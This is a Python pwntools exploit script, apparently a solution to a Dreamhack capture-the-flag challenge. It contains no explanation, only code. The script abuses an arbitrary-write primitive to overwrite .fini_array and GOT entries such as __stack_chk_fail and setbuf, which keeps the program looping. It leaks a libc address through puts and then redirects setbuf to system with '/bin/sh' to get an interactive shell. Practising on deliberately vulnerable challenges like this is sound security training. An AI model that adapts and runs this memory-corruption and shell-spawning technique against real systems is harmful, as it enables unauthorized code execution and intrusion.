from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 11401
r = remote(HOST, PORT)

def convert(val):
    return str(val)[::-1].encode()

def overwrite(addr, val):
    r.sendline(convert(val))
    sleep(0.1)
    r.sendline(convert(addr))
    sleep(0.1)

def writebytes(addr, val):
    for i in range(6):
        overwrite(addr+i, (val >> (8*i)) & 0xff)
    
puts_plt = 0x400540
setbuf_got = 0x600bd0
stack_chk_fail = 0x600bc8

fini_array = 0x6009b8
stdout = 0x600c00

__libc_start_main = 0x600b98
call_start_main = 0x400664

stack_init = 0x4005da
skip_stack_init = 0x4005f6
skip_setbuf = 0x400604

overwrite(fini_array+8, skip_stack_init)
overwrite(stack_chk_fail, skip_stack_init)

overwrite(fini_array, skip_setbuf)
overwrite(stack_chk_fail, stack_init)
overwrite(stack_chk_fail, skip_setbuf)
overwrite(stack_chk_fail+1, skip_setbuf >> 8)

writebytes(__libc_start_main, skip_stack_init)

overwrite(stdout, 0x8)

writebytes(setbuf_got, puts_plt)

overwrite(stack_chk_fail, call_start_main)

libc = u64(r.recvline().strip().ljust(8, b'\x00')) - 0x3ed8b0
system = libc + 0x4f420
binsh = libc + 0x1b3d88

overwrite(stack_chk_fail, skip_setbuf)

writebytes(stdout, binsh)
writebytes(setbuf_got, system)

overwrite(stack_chk_fail, call_start_main)

r.interactive()